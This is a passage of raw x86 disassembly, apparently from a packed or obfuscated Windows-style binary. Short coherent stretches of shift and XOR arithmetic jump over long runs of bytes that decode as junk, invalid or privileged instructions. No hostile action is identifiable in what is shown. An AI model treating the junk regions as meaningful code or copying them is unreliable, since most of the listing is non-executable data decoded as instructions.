  40555f:	mov    ecx,0xe4a48f37
  405564:	adc    eax,0x7f58a820
  405569:	sti    
  40556a:	cmp    eax,0xfed0405b
  40556f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405570:	pop    esp
  405571:	retf   
  405572:	repz in eax,dx
  405574:	loopne 0x4055dd
  405576:	(bad)  
  405578:	(bad)  [edi-0x3c1481fd]
  40557e:	push   ebx
  40557f:	inc    eax
  405580:	pop    edx
  405581:	jae    0x4055ea
  405583:	ja     0x4055e4
  405585:	mov    BYTE PTR [eax+0x60e207dd],bh
  40558b:	loop   0x40554e
  40558d:	ja     0x4055dc
  40558f:	xor    DWORD PTR [edi-0x6],eax
  405592:	xchg   esi,eax
  405593:	push   ebx
  405594:	jnp    0x40556a
  405596:	push   eax
  405597:	rol    DWORD PTR [ecx],0xe0
  40559a:	pop    DWORD PTR [ecx]
  40559c:	ret    
  40559d:	mov    al,ds:0x72fbf8a
  4055a2:	jnp    0x4055e8
  4055a4:	sub    edx,0x71
  4055a7:	mov    esi,0x9de449d1
  4055ac:	sub    DWORD PTR [ecx-0x4e796a1],eax
  4055b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055b3:	lods   eax,DWORD PTR ds:[esi]
  4055b4:	(bad)  
  4055b5:	and    BYTE PTR ds:0x30ab0921,dh
  4055bb:	cld    
  4055bc:	mov    cl,0xec
  4055be:	jmp    0x388499c4
  4055c3:	nop
  4055c4:	mov    ebp,0x4b8babb5
  4055c9:	push   eax
  4055ca:	jle    0x40561c
  4055cc:	xchg   esi,eax
  4055cd:	jle    0x405638
  4055cf:	pop    es
  4055d0:	hlt    
  4055d1:	push   edi
  4055d2:	call   0x6359831f
  4055d7:	lahf   
  4055d8:	(bad)  
  4055d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055da:	fiadd  WORD PTR [edx+0x3593f205]
  4055e0:	cmp    ch,0x1c
  4055e3:	mov    dh,0xb8
  4055e5:	mov    dl,0xd3
  4055e7:	add    eax,0x705bfdc5
  4055ec:	cmp    bh,cl
  4055ee:	loop   0x405653
  4055f0:	in     eax,dx
  4055f1:	repz test eax,0x77a2b59a
  4055f7:	outs   dx,BYTE PTR ds:[esi]
  4055f8:	or     edx,DWORD PTR [edx+0x636002d1]
  4055fe:	push   edi
  4055ff:	ins    BYTE PTR es:[edi],dx
  405600:	test   ah,0x37
  405603:	stc    
  405604:	in     al,0x84
  405606:	enter  0xc872,0xf2
  40560a:	and    DWORD PTR [edi-0x7b],ebx
  40560d:	sbb    BYTE PTR [esi-0x24],dl
  405610:	in     al,dx
  405611:	sbb    esi,DWORD PTR [esi+edi*2]
  405614:	cmp    eax,DWORD PTR [ecx-0x68086682]
  40561a:	mov    dl,0xa5
  40561c:	iret   
  40561d:	icebp  
  40561e:	fs enter 0xa13e,0x9f
  405623:	adc    al,0x8
  405625:	mov    eax,0x25bd7b47
  40562a:	gs dec ebx
  40562c:	sub    DWORD PTR [edi],esp
  40562e:	ret    
  40562f:	mov    ah,BYTE PTR [ebx-0x508794bb]
  405635:	add    al,0xf4
  405637:	je     0x4055fe
  405639:	shl    DWORD PTR [ebx+0x2c],0xad
  40563d:	bound  ecx,QWORD PTR [edx]
  40563f:	icebp  
  405640:	mov    es,WORD PTR [edx-0x10]
  405643:	cwde   
  405644:	mov    esp,0x7787f37b
  405649:	and    BYTE PTR [ebx-0x3a],0xed
  40564d:	sub    edi,DWORD PTR [ecx-0x6d]
  405650:	popa   
  405651:	sub    esi,ebx
  405653:	mov    DWORD PTR [ebp+0x69],edx
  405656:	xor    bl,ah
  405658:	jo     0x40563f
  40565a:	xchg   ecx,eax
  40565b:	push   ebx
  40565c:	lock aas 
  40565e:	xchg   ecx,eax
  40565f:	mov    esp,0x283ca0b9
  405664:	leave  
  405665:	popa   
  405666:	jns    0x40568a
  405668:	push   edx
  405669:	cli    
  40566a:	xlat   BYTE PTR ds:[ebx]
  40566b:	pushf  
  40566c:	fisttp WORD PTR [ebx]
  40566e:	and    al,0xf2
  405670:	ror    DWORD PTR [edi-0x7b],cl
  405673:	es sbb al,0xf6
  405676:	mov    ebp,0xfe2d8f10
  40567b:	in     eax,dx
  40567c:	mov    al,ds:0x19eb0454
  405681:	sbb    ecx,DWORD PTR [ecx-0x55]
  405684:	aas    
  405685:	enter  0x30c2,0x5b
  405689:	adc    eax,0xb779e2e7
  40568e:	add    al,dh
  405690:	fidivr DWORD PTR [edx-0x2e]
  405693:	into   
  405694:	sbb    dl,BYTE PTR [edi]
  405696:	dec    eax
  405697:	inc    ebp
  405698:	fidiv  DWORD PTR [ebp-0x25]
  40569b:	jge    0x40564b
  40569d:	mov    edi,DWORD PTR [ecx+0x12]
  4056a0:	jae    0x405673
  4056a2:	cmc    
  4056a3:	jnp    0x4056ec
  4056a5:	dec    eax
  4056a6:	xchg   esi,eax
  4056a7:	and    DWORD PTR [ecx+0x6041dc0],esp
  4056ad:	ret    0x9d91
  4056b0:	pop    ebx
  4056b1:	add    al,0x63
  4056b3:	xchg   ebx,eax
  4056b4:	(bad)  
  4056b6:	aam    0x40
  4056b8:	sub    edi,edi
  4056ba:	sub    edx,DWORD PTR [edi-0x1a]
  4056bd:	add    bl,BYTE PTR [esi-0x328a522c]
  4056c3:	mov    ebp,0x9bb9e91d
  4056c8:	inc    edi
  4056c9:	adc    DWORD PTR [ebp+0x4119f69e],ecx
  4056cf:	adc    eax,0xadb33b51
  4056d4:	mov    ?,WORD PTR [edx-0x20fe0b29]
  4056da:	push   ebx
  4056db:	sub    ebx,ecx
  4056dd:	mov    ebp,0x13a8d02b
  4056e2:	sbb    dh,al
  4056e4:	xor    BYTE PTR [eax-0x6e],bl
  4056e7:	test   ah,cl
  4056e9:	popf   
  4056ea:	mov    edx,0xff26ad14
  4056ef:	jns    0x4056dd
  4056f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f2:	aaa    
  4056f3:	shr    DWORD PTR [ebp+0x537ca152],1
  4056f9:	fwait
  4056fa:	js     0x4056a3
  4056fc:	adc    BYTE PTR [ebp+ecx*2+0x57],0x81
  405701:	push   esi
  405702:	sub    dl,BYTE PTR [eax]
  405704:	cdq    
  405705:	sub    al,dh
  405707:	push   cs
  405708:	aaa    
  405709:	xchg   esi,eax
  40570a:	rep ins BYTE PTR es:[edi],dx
  40570c:	fidivr DWORD PTR [edi-0x26]
  40570f:	push   eax
  405710:	jo     0x405785
  405712:	push   cs
  405713:	mov    ds:0xd326701b,al
  405718:	add    al,0xb4
  40571a:	jae    0x4056c1
  40571c:	mov    dh,BYTE PTR [eax-0x4e]
  40571f:	inc    esi
  405720:	call   0x47edf805
  405725:	or     DWORD PTR [eax-0x71d224d8],edx
  40572b:	xor    ah,BYTE PTR [ebx+0x68]
  40572e:	xchg   edx,eax
  40572f:	cs out 0x5f,al
  405732:	(bad)  
  405733:	aad    0xeb
  405735:	cmc    
  405736:	cli    
  405737:	cli    
  405738:	pop    eax
  405739:	push   ebp
  40573a:	mov    ah,0x43
  40573c:	std    
  40573d:	ins    BYTE PTR es:[edi],dx
  40573e:	xor    eax,0x822ad194
  405743:	push   0x5
  405745:	pusha  
  405746:	sahf   
  405747:	and    al,0x7c
  405749:	jge    0x405794
  40574b:	sub    bh,BYTE PTR [edx]
  40574d:	jo     0x405783
  40574f:	in     eax,0xc3
  405751:	test   eax,0x46d12520
  405756:	mov    DWORD PTR [edi+ecx*2-0x69],edi
  40575a:	xor    DWORD PTR [ebx],ebx
  40575c:	adc    eax,0x6cbb8a91
  405761:	cwde   
  405762:	xchg   esi,eax
  405763:	pop    esi
  405764:	pushf  
  405765:	sbb    eax,0x831715f5
  40576a:	pop    es
  40576b:	push   ecx
  40576c:	push   ebx
  40576d:	jo     0x4057d5
  40576f:	fisub  DWORD PTR [edx+0x196d321e]
  405775:	add    ebp,eax
  405777:	mov    ecx,0xd288e548
  40577c:	mov    eax,ds:0x44218e0d
  405781:	push   ss
  405782:	data16 jl 0x4057da
  405785:	xlat   BYTE PTR ds:[ebx]
  405786:	push   0xffffffcd
  405788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405789:	pop    ebp
  40578a:	out    0x9d,al
  40578c:	inc    esp
  40578d:	dec    ebx
  40578e:	stc    
  40578f:	stos   DWORD PTR es:[edi],eax
  405790:	(bad)  
  405791:	outs   dx,DWORD PTR ds:[esi]
  405792:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405793:	out    dx,al
  405794:	repz or cl,cl
  405797:	xchg   esp,eax
  405798:	xchg   ebx,eax
  405799:	add    esi,0xfae2de76
  40579f:	inc    eax
  4057a0:	mov    dh,0xdb
  4057a2:	mov    ebp,0xb5f74c61
  4057a7:	clc    
  4057a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057a9:	je     0x40576b
  4057ab:	fisubr WORD PTR [edi-0x4d877b6d]
  4057b1:	inc    esi
  4057b2:	pop    ebx
  4057b3:	std    
  4057b4:	dec    ebx
  4057b5:	popa   
  4057b6:	mov    ebx,0xec9bdd7d
  4057bb:	dec    ecx
  4057bc:	sti    
  4057bd:	jg     0x40579a
  4057bf:	push   edx
  4057c0:	pop    ebx
  4057c1:	je     0x4057cf
  4057c3:	mov    DWORD PTR [esi-0x25],ecx
  4057c6:	pop    ebx
  4057c7:	call   0x810f:0xb578163f
  4057ce:	loopne 0x4057fc
  4057d0:	sbb    BYTE PTR ds:0x792f31dd,ch
  4057d6:	mov    al,0x79
  4057d8:	inc    ecx
  4057d9:	ds pusha 
  4057db:	sbb    al,0x5e
  4057dd:	xor    eax,0x2e7151af
  4057e2:	push   ss
  4057e3:	hlt    
  4057e4:	aaa    
  4057e5:	or     dh,BYTE PTR [esp+edi*2-0x59809b4]
  4057ec:	adc    dh,0x9
  4057ef:	(bad)  
  4057f1:	push   esi
  4057f2:	lahf   
  4057f3:	cmp    edx,DWORD PTR [ebx]
  4057f5:	cld    
  4057f6:	and    dl,BYTE PTR [esi-0xa463215]
  4057fc:	loop   0x405791
  4057fe:	fwait
  4057ff:	jp     0x4057f8
  405801:	inc    esp
  405802:	adc    eax,0x83896578
  405807:	sub    al,0xa7
  405809:	gs pop esi
  40580b:	loop   0x405873
  40580d:	jae    0x405810
  40580f:	ffreep st(6)
  405811:	mov    dl,cl
  405813:	xor    DWORD PTR [ecx],esi
  405815:	add    esp,eax
  405817:	push   edx
  405818:	and    bh,BYTE PTR [edx-0x21]
  40581b:	xchg   edi,eax
  40581c:	ret    0xec1e
  40581f:	nop
  405820:	cdq    
  405821:	lds    edx,FWORD PTR [ebp+0x3dd54ae4]
  405827:	cmc    
  405828:	push   0xc7d965ae
  40582d:	repnz sub eax,0x5912370d
  405833:	je     0x40583c
  405835:	jge    0x40588c
  405837:	xchg   DWORD PTR [ecx],esi
  405839:	lods   al,BYTE PTR ds:[esi]
  40583a:	mov    edx,DWORD PTR [esi+0x4]
  40583d:	neg    DWORD PTR ds:0x4283cb
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x4281b7,0x0
  40584d:	mov    DWORD PTR ds:0x4282a7,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x4282a7,0x2ac5
  405875:	cmp    DWORD PTR ds:0x4281b7,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428eb4
  40588d:	adc    DWORD PTR ds:0x42834b,edx
  405893:	or     DWORD PTR ds:0x42827b,0x369f
  40589d:	neg    DWORD PTR ds:0x4281bb
  4058a3:	sub    DWORD PTR ds:0x42819b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x4058d9
  405910:	out    dx,al
  405911:	retf   
  405912:	jo     0x405981
  405914:	mov    cl,0x18
  405916:	sbb    BYTE PTR [esi-0x1e7e7ee],bl
  40591c:	test   ah,ah
  40591e:	xor    bl,bh
  405920:	out    dx,eax
  405921:	mov    ebx,0x40d8c6a9
  405926:	sbb    al,0xd2
  405928:	jmp    0x6ec8:0x5f492a41
  40592f:	push   ecx
  405930:	int    0x97
  405932:	sub    dl,cl
  405934:	pop    esp
  405935:	inc    esi
  405936:	ror    DWORD PTR [edi+0x6c],0x52
  40593a:	xor    eax,0xb19fdf39
  40593f:	pop    esp
  405940:	add    al,0x12
  405942:	es ja  0x40593b
  405945:	sbb    ch,bl
  405947:	lds    ecx,FWORD PTR ds:0x79f9686d
  40594d:	pop    ds
  40594e:	or     al,0x88
  405950:	sbb    edi,DWORD PTR [ebx-0x6]
  405953:	rol    DWORD PTR [eax+0x2caefb48],0xce
  40595a:	adc    al,BYTE PTR [ebp+0x53d03673]
  405960:	fild   QWORD PTR [eax+0x48df3645]
  405966:	mov    ah,BYTE PTR [eax+0x68]
  405969:	stos   DWORD PTR es:[edi],eax
  40596a:	dec    ebx
  40596b:	out    dx,eax
  40596c:	out    0xa8,eax
  40596e:	push   edx
  40596f:	and    al,0xca
  405971:	cmp    BYTE PTR [edi],bh
  405973:	pop    ecx
  405974:	lods   eax,DWORD PTR ds:[esi]
  405975:	shr    DWORD PTR [ebp-0x4c2230ec],0xcd
  40597c:	ja     0x4059f7
  40597e:	mov    ebx,0x420153c5
  405983:	push   cs
  405984:	mov    ch,0x6a
  405986:	sbb    bh,al
  405988:	mov    ah,0x6a
  40598a:	and    bl,BYTE PTR [edx+0x7e89344f]
  405990:	fs mov bl,dl
  405993:	call   0x2880fe3c
  405998:	adc    dl,BYTE PTR [edx+0x5e]
  40599b:	jo     0x405991
  40599d:	lds    eax,FWORD PTR [ecx-0x5341b74]
  4059a3:	push   edi
  4059a4:	into   
  4059a5:	call   0x557a:0xb8dc6307
  4059ac:	(bad)  [edi]
  4059ae:	fs int3 
  4059b0:	stc    
  4059b1:	call   0x38d8:0xaeaa93c9
  4059b8:	pop    es
  4059b9:	dec    eax
  4059ba:	inc    ebp
  4059bb:	leave  
  4059bc:	dec    eax
  4059bd:	(bad)  
  4059be:	fistp  DWORD PTR [edx]
  4059c0:	jo     0x405a33
  4059c2:	mov    ?,WORD PTR [esi+esi*1]
  4059c5:	bound  edx,QWORD PTR [esi]
  4059c7:	clc    
  4059c8:	leave  
  4059c9:	or     al,0xb5
  4059cb:	(bad)  
  4059cc:	cli    
  4059cd:	dec    edi
  4059ce:	cmp    al,0x2e
  4059d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059d1:	and    ch,ah
  4059d3:	in     al,0x9c
  4059d5:	shl    BYTE PTR [eax+ecx*8+0x26],cl
  4059d9:	repnz inc eax
  4059db:	cmp    BYTE PTR ds:0xd3e8b3b0,al
  4059e1:	repz jecxz 0x40597f
  4059e4:	sub    DWORD PTR [eax+0x51],esi
  4059e7:	add    ecx,eax
  4059e9:	mov    eax,ds:0xe19ced2
  4059ee:	jbe    0x405a65
  4059f0:	sbb    bl,BYTE PTR [ebx]
  4059f2:	push   ebx
  4059f3:	out    dx,eax
  4059f4:	push   0xffffffc2
  4059f6:	sbb    DWORD PTR [edx-0x38],0x85b2737e
  4059fd:	jnp    0x4059a5
  4059ff:	mov    dh,dl
  405a01:	aaa    
  405a02:	pusha  
  405a03:	adc    BYTE PTR [edx],cl
  405a05:	aas    
  405a06:	xchg   edi,eax
  405a07:	pop    ebp
  405a08:	loopne 0x405a82
  405a0a:	dec    edi
  405a0b:	xor    bl,BYTE PTR [edx]
  405a0d:	pushf  
  405a0e:	bound  edx,QWORD PTR [ebp+0x38]
  405a11:	adc    DWORD PTR ds:0xe234bf63,esi
  405a17:	paddsw mm1,QWORD PTR [eax+0x20]
  405a1b:	out    dx,al
  405a1c:	cli    
  405a1d:	dec    esi
  405a1e:	mov    ah,BYTE PTR [eax]
  405a20:	inc    ecx
  405a21:	xchg   esp,eax
  405a22:	and    al,0x3a
  405a24:	cli    
  405a25:	push   es
  405a26:	sbb    DWORD PTR [ebp-0x27],esp
  405a29:	aam    0x94
  405a2b:	pop    edx
  405a2c:	pop    esp
  405a2d:	in     eax,0x8a
  405a2f:	pop    esp
  405a30:	lods   eax,DWORD PTR ds:[esi]
  405a31:	push   edx
  405a32:	neg    BYTE PTR [ebp+0x6b]
  405a35:	mov    dl,0x1a
  405a37:	fsubr  QWORD PTR [eax-0x3a761b6e]
  405a3d:	jb     0x405a8a
  405a3f:	jge    0x405a15
  405a41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a42:	inc    ebx
  405a43:	aaa    
  405a44:	outs   dx,BYTE PTR ds:[esi]
  405a45:	xlat   BYTE PTR ds:[ebx]
  405a46:	inc    ebp
  405a47:	outs   dx,DWORD PTR ds:[esi]
  405a48:	ins    DWORD PTR es:[edi],dx
  405a49:	sahf   
  405a4a:	test   DWORD PTR [esp+edx*8+0x408f26fb],esi
  405a51:	ret    
  405a52:	popf   
  405a53:	addr16 fwait
  405a55:	jp     0x405a2e
  405a57:	add    al,0x9f
  405a59:	pop    ebx
  405a5a:	test   BYTE PTR ds:0x2922909a,al
  405a60:	fisttp WORD PTR ds:0x623c78f6
  405a66:	add    DWORD PTR [ebx-0x563a3830],eax
  405a6c:	adc    dl,BYTE PTR [edx]
  405a6e:	xlat   BYTE PTR ds:[ebx]
  405a6f:	dec    esi
  405a70:	dec    esp
  405a71:	(bad)  
  405a72:	fdiv   QWORD PTR [ebx+ecx*1]
  405a75:	xor    dl,BYTE PTR [ecx]
  405a77:	arpl   di,cx
  405a79:	fwait
  405a7a:	inc    ebp
  405a7b:	ja     0x405a6f
  405a7d:	rcl    DWORD PTR [edi-0x615243b3],0x8d
  405a84:	sbb    DWORD PTR [ebp-0xe],edx
  405a87:	loop   0x405aea
  405a89:	mov    cl,0xbb
  405a8b:	cwde   
  405a8c:	out    dx,eax
  405a8d:	outs   dx,BYTE PTR ds:[esi]
  405a8e:	jmp    0x495a70dc
  405a93:	retf   
  405a94:	cwde   
  405a95:	push   0x71
  405a97:	out    dx,eax
  405a98:	lods   al,BYTE PTR ds:[esi]
  405a99:	enter  0xfbc8,0xfe
  405a9d:	out    dx,eax
  405a9e:	adc    al,BYTE PTR [esp+ebx*4]
  405aa1:	xchg   edx,eax
  405aa2:	mov    ds:0x1ed12369,al
  405aa7:	inc    esp
  405aa8:	mov    al,0x1f
  405aaa:	mov    al,0x46
  405aac:	pop    ebp
  405aad:	cmp    al,0xa8
  405aaf:	in     al,dx
  405ab0:	pop    eax
  405ab1:	out    dx,al
  405ab2:	dec    eax
  405ab3:	mov    ds:0xb622b35b,al
  405ab8:	xchg   ecx,eax
  405ab9:	in     eax,0x58
  405abb:	dec    esi
  405abc:	imul   edi,ebx,0x6
  405abf:	sti    
  405ac0:	push   eax
  405ac1:	dec    edx
  405ac2:	lods   al,BYTE PTR ds:[esi]
  405ac3:	je     0x405ab0
  405ac5:	cmp    edi,ebp
  405ac7:	adc    BYTE PTR [edx],ah
  405ac9:	cli    
  405aca:	fs mov ch,0x2b
  405acd:	jg     0x405b00
  405acf:	and    eax,0xdc2ab814
  405ad4:	test   eax,0x88c9d120
  405ad9:	retf   0x2f5b
  405adc:	fidiv  WORD PTR [ebx-0x63f4e50c]
  405ae2:	mov    dh,0xbb
  405ae4:	cmp    esi,DWORD PTR [edi]
  405ae6:	loopne 0x405ab3
  405ae8:	imul   edx,ebx,0x9
  405aeb:	ds pop edx
  405aed:	stos   DWORD PTR es:[edi],eax
  405aee:	pop    ss
  405aef:	int3   
  405af0:	mov    ah,0xb1
  405af2:	(bad)  
  405af3:	(bad)  
  405af4:	stc    
  405af5:	shl    DWORD PTR [edi+edx*8+0xf],cl
  405af9:	repnz test al,0xc9
  405afc:	and    DWORD PTR [edi],esp
  405afe:	or     eax,0x60cda723
  405b03:	mov    WORD PTR [ecx+0x5e],?
  405b06:	xchg   ebx,eax
  405b07:	and    BYTE PTR [ecx],0xeb
  405b0a:	or     BYTE PTR [ecx-0x645367bf],al
  405b10:	pop    ecx
  405b11:	loop   0x405b60
  405b13:	mov    ?,WORD PTR [esi-0x1b]
  405b16:	cmc    
  405b17:	cmp    BYTE PTR [ebp-0x40],dh
  405b1a:	cmp    BYTE PTR [ebp+eax*2+0x5e],bh
  405b1e:	(bad)  [eax+0x5b3cc023]
  405b24:	call   0x9347:0x163bce95
  405b2b:	mov    ebx,0xd31cbe8c
  405b30:	cmp    eax,0x4cdb9b08
  405b35:	sub    edi,DWORD PTR [ebx]
  405b37:	out    dx,eax
  405b38:	or     DWORD PTR ss:[edi+eiz*4],ebx
  405b3c:	push   esp
  405b3d:	or     al,0xc9
  405b3f:	mov    bh,0x4b
  405b41:	pop    es
  405b42:	stos   DWORD PTR es:[edi],eax
  405b43:	push   eax
  405b44:	jecxz  0x405bc5
  405b46:	dec    eax
  405b47:	xor    edi,DWORD PTR [eax*1-0x2753aec]
  405b4e:	mov    DWORD PTR [edx],0xccd762fe
  405b54:	leave  
  405b55:	fcomp  DWORD PTR [ebx]
  405b57:	loopne 0x405b22
  405b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b5a:	sti    
  405b5b:	fcom   QWORD PTR ds:0xb2d32103
  405b61:	daa    
  405b62:	into   
  405b63:	push   ebp
  405b64:	std    
  405b65:	mov    ebx,0x698d169e
  405b6a:	xor    al,0xb1
  405b6c:	mov    DWORD PTR [ebx],eax
  405b6e:	sub    BYTE PTR [edx+0xc],dl
  405b71:	mov    dl,0xe1
  405b73:	pop    es
  405b74:	add    cl,BYTE PTR [edi]
  405b76:	mov    cs,WORD PTR ds:0x73f8899b
  405b7c:	pop    eax
  405b7d:	mov    ds:0x698011d5,eax
  405b82:	adc    DWORD PTR [esi],esp
  405b84:	xchg   DWORD PTR [esp+ecx*8-0x668b9bb7],ecx
  405b8b:	xchg   ebp,eax
  405b8c:	les    edi,FWORD PTR [eax-0x332ad04]
  405b92:	mov    ds:0xe04085ba,al
  405b97:	mov    dh,0xff
  405b99:	gs push ds
  405b9b:	enter  0x4a21,0xc9
  405b9f:	test   al,0x23
  405ba1:	leave  
  405ba2:	dec    ecx
  405ba3:	out    0x9,al
  405ba5:	xchg   esi,eax
  405ba6:	ret    
  405ba7:	ja     0x405bfc
  405ba9:	pop    ds
  405baa:	sub    DWORD PTR [ebx-0x7b9a83b9],ebx
  405bb0:	sub    ebx,DWORD PTR [ecx-0x3e]
  405bb3:	fs xchg ecx,eax
  405bb5:	mov    ds:0xb899a770,al
  405bba:	inc    edi
  405bbb:	outs   dx,BYTE PTR ds:[esi]
  405bbc:	daa    
  405bbd:	cmp    eax,ebx
  405bbf:	mov    ah,0x84
  405bc1:	repnz inc edx
  405bc3:	iret   
  405bc4:	mov    BYTE PTR [esi-0x4a45d931],dl
  405bca:	xchg   ebx,eax
  405bcb:	aad    0x2d
  405bcd:	push   esp
  405bce:	repnz ins BYTE PTR es:[edi],dx
  405bd0:	xchg   edi,eax
  405bd1:	ret    0x8e8c
  405bd4:	adc    DWORD PTR [edx],ebx
  405bd6:	call   0x8fc8265a
  405bdb:	adc    ebp,ebx
  405bdd:	inc    esi
  405bde:	dec    edi
  405bdf:	and    eax,DWORD PTR [edx+0x63]
  405be2:	shl    DWORD PTR [edi+ebp*1+0xd],1
  405be6:	add    al,0x9f
  405be8:	and    dh,BYTE PTR [edi+0x1bb96f14]
  405bee:	and    esi,DWORD PTR [ecx]
  405bf0:	inc    esi
  405bf1:	mov    ecx,0xb604acb
  405bf6:	and    BYTE PTR [edi+0x31],dl
  405bf9:	xor    al,0x12
  405bfb:	mov    edx,0x90ecee83
  405c00:	lahf   
  405c01:	enter  0xe52,0x98
  405c05:	popf   
  405c06:	push   eax
  405c07:	mov    ds:0x15d42227,eax
  405c0c:	cmp    BYTE PTR [ebx+0xd],ch
  405c0f:	cli    
  405c10:	sbb    al,0xcb
  405c12:	jp     0x405c11
  405c14:	int    0x2a
  405c16:	in     al,0x80
  405c18:	push   edi
  405c19:	cmc    
  405c1a:	pop    esp
  405c1b:	or     edx,DWORD PTR [ebp-0xc3879d9]
  405c21:	out    dx,eax
  405c22:	jnp    0x405c8b
  405c24:	push   esi
  405c25:	cs inc esp
  405c27:	sbb    BYTE PTR [esi-0x44976105],al
  405c2d:	and    al,0x24
  405c2f:	or     ebx,edx
  405c31:	xor    BYTE PTR ds:0x8117c2e0,al
  405c37:	ja     0x405be8
  405c39:	call   0x594af2a8
  405c3e:	xor    eax,0xb3d4a45f
  405c43:	fdivr  DWORD PTR [edi]
  405c45:	(bad)  
  405c47:	add    BYTE PTR [edi-0x7283ed55],0xf3
  405c4e:	sub    DWORD PTR [edx-0x85578e2],edx
  405c54:	dec    edi
  405c55:	nop
  405c56:	sar    BYTE PTR [esi-0x12b6bced],cl
  405c5c:	std    
  405c5d:	mov    cl,0x32
  405c5f:	in     eax,0x18
  405c61:	nop
  405c62:	xor    DWORD PTR [ebx],esi
  405c64:	bound  esp,QWORD PTR [esi-0x18a1e9b1]
  405c6a:	xlat   BYTE PTR ds:[ebx]
  405c6b:	dec    ecx
  405c6c:	jb     0x405c91
  405c6e:	jle    0x405ca7
  405c70:	iret   
  405c71:	sub    DWORD PTR [edx+0x74],edx
  405c74:	pop    es
  405c75:	loopne 0x405bf9
  405c77:	les    ecx,FWORD PTR [edi+esi*2]
  405c7a:	jp     0x405bff
  405c7c:	mov    edx,DWORD PTR [ebx+0x38425c0e]
  405c82:	ja     0x405c8f
  405c84:	fs unpcklps xmm1,xmm7
  405c88:	mov    esi,0xcc16d477
  405c8d:	out    dx,al
  405c8e:	pop    ebx
  405c8f:	sti    
  405c90:	push   ebx
  405c91:	lea    ebx,[edx]
  405c93:	mov    cl,0x6b
  405c95:	loop   0x405cba
  405c97:	dec    edx
  405c98:	imul   edx,DWORD PTR [eax],0x50
  405c9b:	dec    edi
  405c9c:	hlt    
  405c9d:	ss cmc 
  405c9f:	sub    al,BYTE PTR [ebx]
  405ca1:	sti    
  405ca2:	arpl   WORD PTR [edx],cx
  405ca4:	cmc    
  405ca5:	ins    BYTE PTR es:[edi],dx
  405ca6:	sbb    BYTE PTR [esi-0x7c],bh
  405ca9:	cs dec dx
  405cac:	out    dx,al
  405cad:	arpl   WORD PTR [edx],si
  405caf:	lds    edi,FWORD PTR [edi]
  405cb1:	test   dh,dl
  405cb3:	call   0x10a0d98b
  405cb8:	out    0x26,al
  405cba:	mov    ds:0x6f36410e,al
  405cbf:	popa   
  405cc0:	mov    esp,0xc77698d1
  405cc5:	sbb    al,BYTE PTR cs:[edx-0x59]
  405cc9:	out    dx,al
  405cca:	leave  
  405ccb:	int    0x65
  405ccd:	jle    0x405cbd
  405ccf:	add    al,0xc2
  405cd1:	test   eax,0x9cbbde86
  405cd6:	and    BYTE PTR ds:0x3543fcc0,dl
  405cdc:	mov    DWORD PTR [ebp-0x2c],eax
  405cdf:	mov    DWORD PTR [ebp-0x20],0xca79a571
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax-0x47],1
  405d2b:	sub    DWORD PTR [edi+0x7c],esi
  405d2e:	repnz test eax,0x129e1818
  405d34:	sbb    BYTE PTR [eax],bl
  405d36:	aas    
  405d37:	sbb    eax,0xf6d5de93
  405d3c:	clc    
